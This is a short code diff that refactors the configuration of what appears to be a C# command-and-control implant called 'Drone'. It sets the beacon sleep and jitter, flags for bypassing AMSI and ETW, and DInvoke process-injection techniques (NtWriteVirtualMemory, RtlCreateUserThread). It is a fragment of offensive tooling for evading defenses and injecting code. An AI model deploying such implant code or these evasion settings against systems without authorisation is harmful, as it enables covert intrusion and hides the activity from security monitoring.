@@ -51,10 +51,12 @@ namespace Drone
         {
             var config = new DroneConfig();
             
-            config.SetConfig("SleepInterval", 1);
-            config.SetConfig("SleepJitter", 0);
-            config.SetConfig("BypassAmsi", true);
-            config.SetConfig("BypassEtw", true);
+            config.SetConfig("SleepInterval", GetSleepInterval);
+            config.SetConfig("SleepJitter", GetSleepJitter);
+            config.SetConfig("BypassAmsi", GetBypassAmsi);
+            config.SetConfig("BypassEtw", GetBypassEtw);
+            config.SetConfig("AllocationTechnique", GetAllocationTechnique);
+            config.SetConfig("ExecutionTechnique", GetExecutionTechnique);
 
             return config;
         }
@@ -93,5 +95,12 @@ namespace Drone
 
             return definition;
         }
+
+        private static int GetSleepInterval => 1;
+        private static int GetSleepJitter => 0;
+        private static bool GetBypassAmsi => false;
+        private static bool GetBypassEtw => true;
+        private static Type GetAllocationTechnique => typeof(DInvoke.Injection.NtWriteVirtualMemory);
+        private static Type GetExecutionTechnique => typeof(DInvoke.Injection.RtlCreateUserThread);
     }
 }
